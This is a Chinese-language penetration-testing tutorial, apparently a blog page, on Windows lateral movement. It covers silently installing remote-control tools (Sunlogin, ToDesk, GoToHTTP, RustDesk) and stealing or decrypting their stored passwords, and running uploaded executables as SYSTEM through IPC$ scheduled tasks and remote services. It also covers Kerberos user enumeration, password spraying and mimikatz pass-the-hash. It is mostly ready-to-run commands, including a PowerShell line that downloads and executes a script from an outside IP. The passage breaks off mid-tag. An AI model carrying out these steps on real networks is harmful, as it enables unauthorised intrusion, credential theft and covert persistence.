class="headerlink" title="运行注册注册表的命令和运行向日葵"></a>运行注册注册表的命令和运行向日葵</h3><pre class="line-numbers language-none"><code class="language-none">regedit ‐s 3.reg #注册注册表SunloginClient.exe #运行向日葵<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230306151523822.png" alt="image-20230306151523822"></p><h3 id="查看向日葵配置文件"><a href="#查看向日葵配置文件" class="headerlink" title="查看向日葵配置文件"></a>查看向日葵配置文件</h3><pre class="line-numbers language-none"><code class="language-none">shell type C:\ProgramData\Oray\SunloginClient\config.inifastcode：本机识别码去掉kencry_pwd：本机验证码，密文无法直接解密<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230306151550878.png" alt="image-20230306151550878"></p><h3 id="解密密码"><a href="#解密密码" class="headerlink" title="解密密码"></a>解密密码</h3><p>使用github提供的脚本文件进行解密</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/wafinfo/Sunflower_get_Passwordpip install unicornpython Sunflower.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230306151628093.png" alt="image-20230306151628093"></p><h3 id="使用向日葵连接"><a href="#使用向日葵连接" class="headerlink" title="使用向日葵连接"></a>使用向日葵连接</h3><p><img src="assets/image-20230306151657914.png" alt="image-20230306151657914"></p><h1 id="利用远控工具todesk横向移动"><a href="#利用远控工具todesk横向移动" class="headerlink" title="利用远控工具todesk横向移动"></a>利用远控工具todesk横向移动</h1><h2 id="Todesk介绍"><a href="#Todesk介绍" class="headerlink" title="Todesk介绍"></a>Todesk介绍</h2><p>ToDesk是一款类似向日葵的远程控制软件，但比向日葵、TV和AD更为流畅和稳定，它同样具备着内网穿透、文件 传输、云端同步和流量加密等功能 </p><p>有绿色精简版和全功能版两个版本，支持的系统有：Winodws/Linux/MacOS/Android/iOS</p><h2 id="Todesk安装"><a href="#Todesk安装" class="headerlink" title="Todesk安装"></a>Todesk安装</h2><p>全功能版在双击运行、命令行执行时都会出现UAC弹窗和安装界面，这样非常容易被管理员发现，</p><h3 id="静默安装，可以使用-S参数实现"><a href="#静默安装，可以使用-S参数实现" class="headerlink" title="静默安装，可以使用/S参数实现"></a>静默安装，可以使用<code>/S</code>参数实现</h3><pre class="line-numbers language-none"><code class="language-none">shell ToDesk1.exe /S<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230306152031132.png" alt="image-20230306152031132"></p><p>安装完成后自动运行，</p><h3 id="查看配置文件"><a href="#查看配置文件" class="headerlink" title="查看配置文件"></a>查看配置文件</h3><pre class="line-numbers language-none"><code class="language-none">shell type C:\"Program Files (x86)"\ToDesk\config.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230306152059526.png" alt="image-20230306152059526"></p><p>运行ToDesk后会在默认安装目录下生成一个<em>config.ini</em>配置文件，存储的有设备代码、临时密码、安全密码以及登 录用户和密码等重要敏感信息，但密码都经过ToDesk特有加密算法加密，所以不能通过解密得到明文密码，只需 要找到目标主机ToDesk中的<em>tempAuthPassEx</em>临时密码或authPassEx安全密码，将它们<em>覆盖到我们本地ToDesk中</em> 的tempAuthPassEx，<em>重启ToDesk</em>即可得到明文密码 </p><h3 id="使用cs进行文件替换"><a href="#使用cs进行文件替换" class="headerlink" title="使用cs进行文件替换"></a>使用cs进行文件替换</h3><pre class="line-numbers language-none"><code class="language-none">08f4314e069b5fd018daf1ce7fcba51d88e3fa3c97a396aa9157492455e28bb489142e39df3b5f6c2cb4782d1b7ecfb602f4b80a146c密码是063 805<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230306152148707.png" alt="image-20230306152148707"></p><h3 id="重启程序就可以了"><a href="#重启程序就可以了" class="headerlink" title="重启程序就可以了"></a>重启程序就可以了</h3><pre class="line-numbers language-none"><code class="language-none">tasklist 查找进程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230306152216869.png" alt="image-20230306152216869"></p><pre class="line-numbers language-none"><code class="language-none">taskkill /pid 2484 /Ftaskkill /pid 2212 /F<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230306152244061.png" alt="image-20230306152244061"></p><h3 id="重新开启"><a href="#重新开启" class="headerlink" title="重新开启"></a>重新开启</h3><pre class="line-numbers language-none"><code class="language-none">shell C:\"Program Files (x86)"\ToDesk\ToDesk.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230306152313095.png" alt="image-20230306152313095"></p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p><img src="assets/image-20230306152334823.png" alt="image-20230306152334823"></p><h1 id="利用远控工具GoToHTTP横向移动"><a href="#利用远控工具GoToHTTP横向移动" class="headerlink" title="利用远控工具GoToHTTP横向移动"></a>利用远控工具GoToHTTP横向移动</h1><h2 id="GoToHTTP介绍"><a href="#GoToHTTP介绍" class="headerlink" title="GoToHTTP介绍"></a>GoToHTTP介绍</h2><p>GotoHTTP工作在B2C模式。使用远程控制时，您不必在每一台电脑上都安装远程软件。不管身处何处，有浏览器 就能访问远程电脑。 即使公司网络管控，仍然可以控制或被控制。支持文件传输、无人值守、剪切板同步、远程语 音、远程摄像头、多显示器支持 </p><p>下载：<a href="http://www.gotohttp.com/goto/download.12x">http://www.gotohttp.com/goto/download.12x</a></p><h2 id="GoToHTTP使用"><a href="#GoToHTTP使用" class="headerlink" title="GoToHTTP使用"></a>GoToHTTP使用</h2><h3 id="使用cs或者其他工具将文件上传到目标机器"><a href="#使用cs或者其他工具将文件上传到目标机器" class="headerlink" title="使用cs或者其他工具将文件上传到目标机器"></a>使用cs或者其他工具将文件上传到目标机器</h3><p><img src="assets/image-20230306152455079.png" alt="image-20230306152455079"></p><h3 id="运行该文件"><a href="#运行该文件" class="headerlink" title="运行该文件"></a>运行该文件</h3><p><img src="assets/image-20230306152514096.png" alt="image-20230306152514096"></p><h3 id="在运行目录下会生成一个配置文件"><a href="#在运行目录下会生成一个配置文件" class="headerlink" title="在运行目录下会生成一个配置文件"></a>在运行目录下会生成一个配置文件</h3><p><img src="assets/image-20230306152534606.png" alt="image-20230306152534606"></p><h3 id="查看配置文件里面有连接地址和账号密码"><a href="#查看配置文件里面有连接地址和账号密码" class="headerlink" title="查看配置文件里面有连接地址和账号密码"></a>查看配置文件里面有连接地址和账号密码</h3><p><img src="assets/image-20230306152556570.png" alt="image-20230306152556570"></p><h3 id="使用网页连接"><a href="#使用网页连接" class="headerlink" title="使用网页连接"></a>使用网页连接</h3><p><img src="assets/image-20230306152621582.png" alt="image-20230306152621582"></p><h1 id="利用远控工具RustDESK横向移动"><a href="#利用远控工具RustDESK横向移动" class="headerlink" title="利用远控工具RustDESK横向移动"></a>利用远控工具RustDESK横向移动</h1><h2 id="RustDESK介绍"><a href="#RustDESK介绍" class="headerlink" title="RustDESK介绍"></a>RustDESK介绍</h2><p>远程桌面软件，开箱即用，无需任何配置，完美替代TeamViewer。您完全掌控数据，不用担心安全问题。您可以 使用我们的注册/中继服务器，或者自己设置，亦或者开发您的版本。 </p><p><a href="https://gitee.com/rustdesk/rustdesk/releases">https://gitee.com/rustdesk/rustdesk/releases</a></p><h2 id="RustDESK安装"><a href="#RustDESK安装" class="headerlink" title="RustDESK安装"></a>RustDESK安装</h2><h3 id="RustDESK安装-1"><a href="#RustDESK安装-1" class="headerlink" title="RustDESK安装"></a>RustDESK安装</h3><p><img src="assets/image-20230306152725775.png" alt="image-20230306152725775"></p><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="assets/image-20230306152739118.png" alt="image-20230306152739118"></p><h3 id="找到配置文件"><a href="#找到配置文件" class="headerlink" title="找到配置文件"></a>找到配置文件</h3><pre class="line-numbers language-none"><code class="language-none">shell dir C:\Users\administrator\AppData\Roaming\RustDesk\configshell type C:\Users\administrator\AppData\Roaming\RustDesk\config\RustDesk.toml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230306152802807.png" alt="image-20230306152802807"></p><p>可以看到没有密码</p><h3 id="需要手写这个密码，然后重启工具"><a href="#需要手写这个密码，然后重启工具" class="headerlink" title="需要手写这个密码，然后重启工具"></a>需要手写这个密码，然后重启工具</h3><pre class="line-numbers language-none"><code class="language-none">tasklisttaskkill /pid 2988 /Fshell C:\Users\jack\Desktop\rustdesk-1.1.9.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230306152825053.png" alt="image-20230306152825053"></p><p><img src="assets/image-20230306152833412.png" alt="image-20230306152833412"></p><h3 id="查看密码已经可以了"><a href="#查看密码已经可以了" class="headerlink" title="查看密码已经可以了"></a>查看密码已经可以了</h3><pre class="line-numbers language-none"><code class="language-none">shell type C:\Users\administrator\AppData\Roaming\RustDesk\config\RustDesk.toml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230306152851451.png" alt="image-20230306152851451"></p><h3 id="连接目标"><a href="#连接目标" class="headerlink" title="连接目标"></a>连接目标</h3><p><img src="assets/image-20230306152915585.png" alt="image-20230306152915585"></p><h1 id="IPC配合计划任务横向移动"><a href="#IPC配合计划任务横向移动" class="headerlink" title="IPC配合计划任务横向移动"></a>IPC配合计划任务横向移动</h1><h2 id="IPC-横向"><a href="#IPC-横向" class="headerlink" title="IPC$横向"></a>IPC$横向</h2><h3 id="IPC-介绍"><a href="#IPC-介绍" class="headerlink" title="IPC$介绍"></a>IPC$介绍</h3><p>IPC( Internet ProcessConnection)共享“命名管道”的资源,是为了实现进程间通信而开放的命名管道。IPC可以<br>通过验证 用户名和密码 获得相应的权限,通常在 <em>远程管理计算机</em>和<em>查看计算机的共享资源</em>时使用。</p><p>通过ipc$,可以与目标机器建立连接。利用这个连接,不仅可以访问目标机器中的 文件进行上传、下载等操作，还可以<br>在目标机器上运行其他命令,以获取目标机器的目录结构、用户列表等信息。</p><p>首先,需要建立一个ipc$</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.70.16\ipc$ "admin@123" /user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230307112918522.png" alt="image-20230307112918522"></p><pre class="line-numbers language-none"><code class="language-none">net use<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230307113134397.png" alt="image-20230307113134397"></p><h3 id="IPC-利用条件"><a href="#IPC-利用条件" class="headerlink" title="IPC$利用条件"></a>IPC$利用条件</h3><h4 id="1、开启了139、445端口"><a href="#1、开启了139、445端口" class="headerlink" title="1、开启了139、445端口"></a>1、开启了139、445端口</h4><p>ipcs可以实现远程登录及对默认共享资源的访问，而139端口的开启表示NetBIOS协议的应用。通过139、445端口,<br>可以实现对共享文件打印机的访问。因此,一般来讲,ipcs需要139、 445端口的支持。</p><h4 id="2、管理员开启了默认共享"><a href="#2、管理员开启了默认共享" class="headerlink" title="2、管理员开启了默认共享"></a>2、管理员开启了默认共享</h4><p>默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘(c、d、e等和系统目录winnt或windows(adminS )通过ipc,可以实现对这些默认共享目录的访问</p><h3 id="IPC-连接失败原因"><a href="#IPC-连接失败原因" class="headerlink" title="IPC$连接失败原因"></a>IPC$连接失败原因</h3><ul><li><p>用户名或密码错误</p></li><li><p>目标没有打开ipc$默认共享</p></li><li><p>不能成功连接目标的139、445端口</p></li></ul><h3 id="IPC-连接常见错误"><a href="#IPC-连接常见错误" class="headerlink" title="IPC$连接常见错误"></a>IPC$连接常见错误</h3><pre class="line-numbers language-none"><code class="language-none">错误号5:拒绝访问错误号51: Windows 无法找到网络路径,即网络中存在问题。错误号53:找不到网络路径,包括IP地址错误、目标未开机、目标的lanmanserver服务未 启动目标有防火墙(端口过滤)错误号67:找不到网络名，包括lanmanworkstation服 务未启动、ipcs 已被删除错误号1219:提供的凭据与已存在的凭据集冲突。例如，已经和目标建立了ipcs,需要在删除原连接后重新进行连接。错误号1326:未知的用户名或错误的密码错误号1792;试图登录,但是网络登录服务没有启动，包括目标NetLogon服务未启动(连接域控制器时会出现此情况)。错误号2242:此用户的密码已经过期。例如'目标机器设置了账号管理策略，强制用户定期修改密码°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利用方式-windows自带命令"><a href="#利用方式-windows自带命令" class="headerlink" title="利用方式-windows自带命令"></a>利用方式-windows自带命令</h3><h4 id="dir命令"><a href="#dir命令" class="headerlink" title="dir命令"></a>dir命令</h4><p>在使用netuse命令与远程目标机器建立ipcs后,可以使用dir命令列出远程主机中的文件,如图</p><pre class="line-numbers language-none"><code class="language-none">dir \\192.168.70.14\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230307114224838.png" alt="image-20230307114224838"></p><h4 id="tasklist命令"><a href="#tasklist命令" class="headerlink" title="tasklist命令"></a>tasklist命令</h4><p>在使用netuse命令与远程目标机器建立ipcs后,可以使用tasklist命令的<code>/S、/U /P</code>参数列出远程主机<br>上运行的进程</p><pre class="line-numbers language-none"><code class="language-none">tasklist /s 192.168.70.16<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230307132143215.png" alt="image-20230307132143215"></p><h4 id="利用方式-schtasks"><a href="#利用方式-schtasks" class="headerlink" title="利用方式-schtasks"></a>利用方式-schtasks</h4><h5 id="1-查看系统时间"><a href="#1-查看系统时间" class="headerlink" title="(1) 查看系统时间"></a>(1) 查看系统时间</h5><pre class="line-numbers language-none"><code class="language-none">net time \\192.168.70.16<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230307132237149.png" alt="image-20230307132237149"></p><h5 id="2-复制文件"><a href="#2-复制文件" class="headerlink" title="(2)复制文件"></a>(2)复制文件</h5><pre class="line-numbers language-none"><code class="language-none">copy c:\users\mb\desktop\1.exe \\192.168.70.16\C$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230307132433371.png" alt="image-20230307132433371"></p><h5 id="3-创建计划任务"><a href="#3-创建计划任务" class="headerlink" title="(3)创建计划任务"></a>(3)创建计划任务</h5><pre class="line-numbers language-none"><code class="language-none">schtasks /create /u administrator /p admin@123 /s 192.168.70.16 /tn run111 /sc onstart /tr c:\1.exe /ru system /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230307134412749.png" alt="image-20230307134412749"></p><h5 id="4-执行计划任务"><a href="#4-执行计划任务" class="headerlink" title="(4)执行计划任务"></a>(4)执行计划任务</h5><pre class="line-numbers language-none"><code class="language-none">schtasks /run /u administrator /p admin@123 /s 192.168.70.16 /i /tn "run111"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230307134459690.png" alt="image-20230307134459690"></p><h5 id="5-删除计划任务"><a href="#5-删除计划任务" class="headerlink" title="(5)删除计划任务"></a>(5)删除计划任务</h5><pre class="line-numbers language-none"><code class="language-none">schtasks /delete /u administrator /p admin@123 /s 192.168.70.16 /tn "run111" /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230307134540921.png" alt="image-20230307134540921"></p><h5 id="6-清除IPC连接"><a href="#6-清除IPC连接" class="headerlink" title="(6)清除IPC连接"></a>(6)清除IPC连接</h5><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.70.16\ipc$ /del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="IPC配合系统服务横向移动"><a href="#IPC配合系统服务横向移动" class="headerlink" title="IPC配合系统服务横向移动"></a>IPC配合系统服务横向移动</h1><h2 id="SC命令详解"><a href="#SC命令详解" class="headerlink" title="SC命令详解"></a>SC命令详解</h2><p>获取到密码并着手横向时，却发现Task Sheduler服务没有启用。这时候我们就可以远程 建立服务,然后再 启用服务 来运行我们想要运行的命令。</p><pre class="line-numbers language-none"><code class="language-none">描述:SC是用来与服务控制管理器和服务进行通信的命令行程序。用法:sc &lt;server&gt; [command] [service name] &lt;option1&gt; &lt;option2&gt;...&lt;server&gt;选项的格式为"\\ServerName"可通过键入以下命令获取有关命令的更多帮助: "sc [command]"命令:query-----------查询服务的状态，或枚举服务类型的状态。querex----------查询服务的扩展状态，或枚举服务类型的状态。start-----------启动服务。pause-----------向服务发送PAUSE控制请求。interrogate-----向服务发送INTERROGATE 控制请求。continue--------向服务发送CONTINUE控制请求。stop------------向服务发送STOP请求。config----------更改服务的配置(永久)。description-----更改服务的描述。failure---------更改失败时服务执行的操作。failureflag-----更改服务的失败操作标志。sidtype---------更改服务的服务SID 类型privs-----------更改服务的所需特权。managedaccount--更改服务以将服务帐户密码标记为由LSA 管理。qc--------------查询服务的配置信息。qdescription----查询服务的描述。qfailure--------查询失败时服务执行的操作。qfailureflag----查询服务的失败操作标志。qsidtype--------查询服务的服务SID 类型。qprivs----------查询服务的所需特权。qtriggerinfo----查询服务的触发器参数。qpreferrednode--查询服务的首选NUMA节点。qmanagedaccount-查询服务是否将帐户与LSA管理的密码结合使用。qprotectoio-----查询服务的进程保护级别。quserservice----查询用户服务模板的本地实例。delete ---------( 从注册表中)删除服务。create----------创建服务(并将其添加到注册表中)。control---------向服务发送控制。sdshow----------显示服务的安全描述符。sdset-----------设置服务的安全描述符。showsid---------显示与任意名称对应的服务SID字符串。triggerinfo-----配置服务的触发器参数。preferrednode---设置服务的首选NUMA节点。GetDisplayName--获取服务的DisplayName.GetKeyName------获取服务的ServiceKeyName。EnumDepend------枚举服务依赖关系。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="创建ipc链接"><a href="#创建ipc链接" class="headerlink" title="创建ipc链接"></a>创建ipc链接</h3><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.70.16\ipc$ "admin@123" /user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h3><pre class="line-numbers language-none"><code class="language-none">copy C:\Users\mb\Desktop\1.exe \\192.168.70.16\C$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h3><pre class="line-numbers language-none"><code class="language-none">sc \\192.168.70.16 create test binpath= "cmd.exe /c C:\1.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230307143037109.png" alt="image-20230307143037109"></p><h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><pre class="line-numbers language-none"><code class="language-none">sc \\192.168.70.16 start test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230307143401559.png" alt="image-20230307143401559"></p><h1 id="Password-Spraying密码喷洒攻击和域内用户枚举横向移动"><a href="#Password-Spraying密码喷洒攻击和域内用户枚举横向移动" class="headerlink" title="Password Spraying密码喷洒攻击和域内用户枚举横向移动"></a>Password Spraying密码喷洒攻击和域内用户枚举横向移动</h1><h2 id="域内用户枚举攻击原理"><a href="#域内用户枚举攻击原理" class="headerlink" title="域内用户枚举攻击原理"></a>域内用户枚举攻击原理</h2><p>正常域用户登录主机，我们可以通过<code>net user /domain</code>来列举出域内的用户。</p><p>但是当我们用非域用户进行登录时，是不能使用”net user /domain”这条命令的。</p><p>或者当主机不在域内但是能与域控通信时，以上两种情况我们可以通过以下方法对 域内用户进行枚举。</p><p><em>Kerberos</em>本身是一种基于身份认证的协议，在Kerberos协议认证的<em>第一阶段</em>AS-REQ ，当用户不存<br>在时，返回包提示错误。当用户名存在，密码正确和密码错误时，AS-REP的返回包不一样。所以可以<br>利用这点，对域内进行域用户枚举和密码喷洒攻击。在AS-REQ阶段客户端向AS发送用户名，AS对用<br>户名进行验证，<em>用户存在和不存在返回的数据包不一样</em>，所以，<em>根据AS的返回包来对域用户进行枚举</em></p><p><img src="assets/image-20230307145202908.png" alt="image-20230307145202908"></p><h2 id="枚举工具介绍"><a href="#枚举工具介绍" class="headerlink" title="枚举工具介绍"></a>枚举工具介绍</h2><h3 id="kerbrute工具"><a href="#kerbrute工具" class="headerlink" title="kerbrute工具"></a>kerbrute工具</h3><p>kerbrute工具链接：<a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></p><pre class="line-numbers language-none"><code class="language-none">kerbrute.exe userenum --dc 域控ip -d 域名 用户名字典.txtc:\users\mb\desktop\kerbrute.exe userenum --dc 192.168.70.16 -d hack.com c:\users\mb\desktop\1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230307145520237.png" alt="image-20230307145520237"></p><h2 id="密码喷洒攻击原理"><a href="#密码喷洒攻击原理" class="headerlink" title="密码喷洒攻击原理"></a>密码喷洒攻击原理</h2><p>在确认用户存在后，客户端又会发送-一个AS-REQ请求，如果密码正确，则返回AS-REP。 否则返回KRB5KDC_ ERP PREAUTH_ FAILED,</p><p>在常规的爆破中，我们都是先用很多密码去碰撞一个账号，这样很容易导致账号被锁定。而密码喷洒就是先用<em>一个密码去碰撞很多账号</em>，此方法能有效的避免账号被锁定的问题</p><h3 id="kerbrute工具-1"><a href="#kerbrute工具-1" class="headerlink" title="kerbrute工具"></a>kerbrute工具</h3><pre class="line-numbers language-none"><code class="language-none">c:\users\mb\desktop\kerbrute.exe passwordspray -d hack.com c:\users\mb\desktop\1.txt admin@123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230307195737495.png" alt="image-20230307195737495"></p><p>然后跟破解出账号和密码的账号进行远程桌面或ipc链接，上传恶意文件，写计划任务，服务等操作</p><h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><p>CrackMapExec (又名CME)是一款非常好用的密码喷洒攻击的工具，在<em>Kali Linux</em>默认已经安装<br>好。<br>下载地址: <a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></p><pre class="line-numbers language-none"><code class="language-none">crackmapexec smb 192.168.70.16 -u 1.txt -p 'admin@123' --continue-on-success<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230307201555130.png" alt="image-20230307201555130"></p><h3 id="DomainPasswordSpray-ps1"><a href="#DomainPasswordSpray-ps1" class="headerlink" title="DomainPasswordSpray.ps1"></a>DomainPasswordSpray.ps1</h3><p>必须是<em>域内用户</em>才可以</p><pre class="line-numbers language-none"><code class="language-none">Userlist: 用户字典Password:单个密码PasswordList:密码字典OutFile:输出的文件名Domain:要爆破的域Force:强制喷洒继续，而不提示确认。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Import-Module .\DomainPasswordSpray.ps1  #导入Invoke-DomainPasswordSpray -UserList c:\users\mb\desktop\1.txt -Domain hack.com -Password admin@123 -Force -OutFile res.txtshell powershell.exe -exec bypass -command " &amp; {import-module C:\Users\mb\Desktop\DomainPasswordSpray.ps1;Invoke-DomainPasswordSpray -UserList C:\Users\mb\Desktop\1.txt -Domain hack.com -Password admin@123 -Force -OutFile res.txt }"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230308091522214.png" alt="image-20230308091522214"></p><h4 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h4><pre class="line-numbers language-none"><code class="language-none">#python开启http服务python -m http.serve 8080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">shell powershell -exect bypass -c IEX (New-ObjectSystem.Net.Webclient).DownloadString('http://118.178.70.13:8080/DomainPasswordSpray.ps1');import-module .\DomainPasswordSpray.ps1;Invoke-DomainPasswordSpray -UserList 1.txt -Domain hack.com -Password admin@123 -Force -OutFile res.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="CS自带命令"><a href="#CS自带命令" class="headerlink" title="CS自带命令"></a>CS自带命令</h4><pre class="line-numbers language-none"><code class="language-none">beacon&gt; powershell-import powershell\DomainPasswordSpray.ps1beacon&gt; Invoke-DomainPasswordSpray -UserList c:\users\mb\desktop\1.txt -Domain hack.com -Password admin@123 -Force -OutFile c:\users\mb\desktop\res.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230308090518266.png" alt="image-20230308090518266"></p><h1 id="Pass-the-Hash哈希传递攻-PTH-横向移动"><a href="#Pass-the-Hash哈希传递攻-PTH-横向移动" class="headerlink" title="Pass the Hash哈希传递攻(PTH)横向移动"></a>Pass the Hash哈希传递攻(PTH)横向移动</h1><h2 id="哈希传递"><a href="#哈希传递" class="headerlink" title="哈希传递"></a>哈希传递</h2><p>大多数渗透测试人员都听说过哈希传递(Pass The Hash)攻击。该方法通过找到与账户相关的密码散列值(通常是<br>NTLM Hash)来进行攻击。</p><p>在域环境中,用户登录计算机时使用的大都是域账号,大量计算机在安装时会使用相同的本地管理员账号和密码,</p><p>因此,如果计算机的本地管理员<em>账号和密码也是相同</em>的,攻击者就能使用<em>哈希传递攻击</em>的方法登录内网中的其他计算机。</p><p>同时通过哈希传递攻击,攻击者不需要花时间破解密码散列值(进而获得密码明文)。<br>在Windows网络中,散列值就是用来证明身份的(有正确的用户名和密码散列值,就能通过验证),而微软自己的产品<br>和工具显然不会支持这种攻击,于是,攻击者往往会使用第三方工具来完成任务。</p><p>在WindowsServer2012R2及之后版本的操作系统中,默认在内存中不会记录明文密码,因此,攻击者往往会使用工具将散列值传递到其他计算机中,进行权限验证,实现对远程计算机的控制。</p><h2 id="希传递攻击原理"><a href="#希传递攻击原理" class="headerlink" title="希传递攻击原理"></a>希传递攻击原理</h2><p>当用户需要登录某网站时,如果该网站使用明文的方式保存用户的密码,那么,一旦该网站出现安全漏洞,所有用户的明文密码均会被泄露。</p><p>由此,产生了散列值的概念。当用户设置密码时,网站服务器会对用户输入的密码进行散列加密处理(通常使用MD5算法)散列加密算法般为单向不可逆算法。</p><p>当用户登录网站时,会先对用户输入的密码进行散列加密处理,再与数据库中存储的散列值进行对比，如果完全相同则表示验证成功。</p><p>主流的Windows操作系统,通常会使用NTLM Hash对访问资源的用户进行身份验证。早期版本的Windows操作系统,则使用LMHash对用户密码进行验证。但是，当密码大于等于14位时,就无法使用LM Hash了。</p><p>从Windowsvista和Windowsserver2008版本开始, Windows操作系统默认禁用LM Hash,因为在使用NTLM Hash进行身份认证时,不会使用明文口令,而是将明文口令通过系统API(例如Lsalogon User)转换成散列值。不过，攻击者在获得密码散列值之后,依旧可以使用哈希传递攻击来模拟用户进行认证。</p><h2 id="哈希传递条件"><a href="#哈希传递条件" class="headerlink" title="哈希传递条件"></a>哈希传递条件</h2><p>哈希传递攻击的前提:有<em>管理员</em>的NTLM Hash，并且目标机器开放<em>445端口</em>。</p><h4 id="在工作组环境中"><a href="#在工作组环境中" class="headerlink" title="在工作组环境中"></a>在工作组环境中</h4><p>Windows Vista之前的机器，可以使用<em>本地管理员组内用户</em>进行攻击。</p><p>Windows Vista之后的机器，只能是<em>administrator用户</em>的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问。</p><h4 id="在域环境中"><a href="#在域环境中" class="headerlink" title="在域环境中"></a>在域环境中</h4><p>只能是<em>域管理员组内用户</em>(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何- -台机器</p><h2 id="哈希传递实验"><a href="#哈希传递实验" class="headerlink" title="哈希传递实验"></a>哈希传递实验</h2><h3 id="实验环境如下"><a href="#实验环境如下" class="headerlink" title="实验环境如下"></a>实验环境如下</h3><pre class="line-numbers language-none"><code class="language-none">192.168.70.13 机器是xy用户进行登录 (本地管理员)192.168.70.14 机器是mb登录 (本地管理员)两台机器的administrator administrator 用户账号密码相同<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="目前使用dir不能访问20机器"><a href="#目前使用dir不能访问20机器" class="headerlink" title="目前使用dir不能访问20机器"></a>目前使用dir不能访问20机器</h3><p><img src="assets/image-20230308103522584.png" alt="image-20230308103522584"></p><h3 id="使用mimikatz进行hash传递"><a href="#使用mimikatz进行hash传递" class="headerlink" title="使用mimikatz进行hash传递"></a>使用mimikatz进行hash传递</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:hack.com /ntlm:570a9a65db8fba761c1008a51d4c95ab"mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:192.168.70.13 /ntlm:570a9a65db8fba761c1008a51d4c95ab"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230308103912088.png" 